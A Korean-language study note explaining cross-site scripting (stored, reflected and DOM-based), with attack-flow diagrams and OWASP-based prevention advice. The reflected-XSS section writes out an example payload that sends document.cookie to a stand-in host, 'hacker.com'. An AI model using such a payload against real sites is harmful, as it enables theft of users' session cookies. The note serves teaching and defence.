# XSS(Cross Site Scripting)

`XSS`는 **악의적인 스크립트 언어를 통해 웹 사이트가 아니라 사용자를 공격하는 방법**입니다. 

스크립트는 Client-side인 브라우저에서 해석되어 실행되기 때문에 사용자에게 피해를 입히는 것이 특징입니다. 

`CSRF`가 인증된 사용자에 대한 웹 앱의 신뢰를 악용한 것이라면, `XSS`는 특정 웹 앱에 대한 사용자의 신뢰를 악용합니다.

XSS 공격의 잠재적 피해는 다음과 같습니다.

1. 피해자의 쿠키를 탈취하여 로그인 정보를 획득
2. 사용자의 키 입력을 캡쳐
3. 사용자를 악성 웹 사이트로 리디렉션
4. 그 밖의 브라우저에서 실행 할 수 있는 악의적인 스크립트 실행

XSS의 종류는 크게 3가지가 있습니다.

#### 1. Stored(or Persistent) XSS

**서버의 DB에 스크립트를 저장하여 지속적인 피해를 발생시키는 방법**입니다.

쉽게 말하면 게시글이나 댓글과 같이 서버에 저장되는 곳에 스크립트를 넣어 서버에 저장 시킴으로써 해당 글이나 댓글을 보는 사람 모두에게 피해를 입히는 방법입니다. 

<img src="https://user-images.githubusercontent.com/53790137/153735935-d468e76a-4bfe-4169-b7ff-bf79473f94fd.png" width="500" height="300">

1. 해커가 게시글에 악성 스크립트를 작성하여 등록을 요청합니다.
2. 웹 앱은 스크립트의 존재를 파악하지 못하고 DB에 저장합니다.
3. 사용자가 해커가 만든 게시글을 요청합니다. 서버는 DB에서 꺼내서 응답하고 사용자의 브라우저는 렌더링하면서 스크립트를 실행시킵니다.


#### 2. Reflected XSS

**요청 파라미터 값을 응답에 사용하는 부분에 요청 파라미터로 스크립트를 삽입하는 공격**입니다.

<img src="https://user-images.githubusercontent.com/53790137/153736324-d899de44-9108-4928-8923-b6b10c72ecc2.png" width="500" height="300">

1. 해커가 사용자에게 악의적인 스크립트가 담긴 URL을 전송합니다.
2. 사용자가 URL을 클릭하여 WebApp에 요청합니다. 서버는 입력된 값을 그대로 응답 메시지에 포함시켜 응답하고 사용자의 브라우저는 렌더링하면서 스크립트를 실행합니다.

예를 들어 "홍길동"을 검색하면 "홍길동 검색 결과 : 1개"와 같이 서버가 응답한다고 가정하겠습니다.

요청 URL은 다음과 같습니다.

```
    https://samplewebapp.com/search?q=홍길동
```

해커는 서버에 대한 사용자의 쿠키를 모두 자신의 서버로 보내고 싶습니다. URL을 만들면 다음과 같습니다.

URL 인코딩은 편의상 생략하겠습니다.

```
    https://samplewebapp.com/search?q=
    <script>
        window.location='http://hacker.com/collectCookies?cookie=' + document.cookie
    </scirpt>
```

이렇게 만든 악성 URL을 사용자가 클릭하게 된다면 `q=` 이하의 스크립트가 그대로 HTML에 삽입되어 사용자에게 응답되고 사용자의 브라우저는 렌더링을 하면서 스크립트를 실행하게 됩니다.

검색 결과 말고도 에러 메시지와 같이 입력 값을 응답에 그대로 사용하는 부분이라면 모두 적용될 수 있습니다.

#### 3. DOM-based XSS

> **DOM이란,** Document Object Model를 말하며 브라우저가 HTML 페이지를 로드하면서 HTML 태그들을 객체화 시킨 것을 의미합니다.
> **DOM의 목적**은 HTML 페이지가 출력된 이후 <ins>HTML 요소들의 모양이나 콘텐츠를 스크립트를 통해 동적으로 제어하기 위함</ins>입니다. 
> 여기서 `DOM-based`의 의미는 **DOM을 제어하는 스크립트에 악의적인 스크립트를 심는다**고 생각하면 될 것 같습니다.

`Stored XSS`와 `Reflected XSS`는 모두 서버에서 사용자의 입력을 필터링 하지 않는 취약점을 이용한 방법입니다. 즉, **서버 코드의 취약점을 이용한 공격**입니다. 

반면에 `DOM-based XSS`는 **DOM을 조작하는 클라이언트 코드의 취약점을 이용한 공격**으로써 서버에서 필터링 하는 것으로는 해결할 수 없다는 특징이 있습니다.

<img src="https://user-images.githubusercontent.com/53790137/153737045-314abff5-4784-4dc2-aae5-e02177118a6e.png" width="500" height="300">

1. 해커는 악의적인 스크립트가 포함된 URL을 사용자에게 보내 클릭하게 유도합니다.
2. 사용자는 URL을 클릭하여 응답을 받습니다. 응답 메시지에는 사용자의 입력 값을 사용하여 동적으로 DOM을 조작하는 클라이언트 코드가 있습니다. 해당 코드가 실행되면서 해커가 심은 스크립트가 실행됩니다.

이해가 쉽게 좀 더 구체적인 상황을 그림으로 보도록 하겠습니다.

![image](https://user-images.githubusercontent.com/53790137/153737414-dc705388-d97a-4745-8456-dec91c54e471.png)

1. 해커가 악의적인 스크립트가 담긴 악성 URL을 사용자에게 보냅니다.
2. 사용자는 악성 URL을 클릭하여 웹 사이트에게 요청합니다.
3. 웹 사이트는 요청 파라미터 `keyword`에 입력된 값을 이용하여 DOM을 조작하는 클라이언트 코드를 응답 메시지에 포함하여 보냅니다.
4. 사용자의 브라우저는 응답 받은 HTML을 렌더링 하여 출력하고 클라이언트 코드를 실행하여 keyword의 값을 DOM 객체에 삽입합니다. (이때 해커가 심은 스크립트가 삽입되면서 자동으로 실행됩니다.)
5. 해커가 심은 악의적인 스크립트가 실행되어 해커의 서버에게 데이터를 전송 시킵니다.

`Reflected XSS`의 예시와 비슷하여 차이점이 쉽게 눈에 안 들어올 수 있습니다. 

`반사 XSS`의 예시는 서버에서 요청 파라미터 값을 읽어서 HTML에 직접 삽입하는 경우이고, `DOM-based XSS`의 예시는 HTML에 서버가 삽입하는 것이 아니라 클라이언트에게 맡기는 경우입니다.

`DOM-based XSS`도 서버에서 요청을 필터링 하면 되지 않느냐는 물음이 생길 수 있습니다.

`#`을 이용하여 다음과 같이 URL을 변경하면 `#`이하는 서버에 전달되지 않습니다. 

```
    http://website/search?keyword=something#<script>...<script>
```

## XSS 방지 방법

- 사용자의 입력을 절대 신뢰하지 않습니다. 
- 출력 인코딩을 구현합니다. 스크립트에 사용되는 특수문자 같은 것을 삭제하거나 인코딩하여 출력합니다.
- 사용자의 입력 유효성 검사를 수행합니다. 필터링을 통해 제거하거나 오류 처리를 합니다.
- 웹 앱 개발이 [OWASP의 XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)와 일치하는지 확인합니다.
- 침투 테스트를 수행하여 보안을 확인합니다.
- XSS 방지 라이브러리를 사용하는 것도 한 방법입니다.

위는 서버에서 방지하는 방법이고 사용자는 웹 방화벽이나 브라우저 확장 앱중 XSS를 방어하는 애플리케이션을 설치하는 방법이 있습니다.

## 참고
- https://noirstar.tistory.com/266
- https://alwaysbeen.tistory.com/57
- https://www.synopsys.com/glossary/what-is-cross-site-scripting.html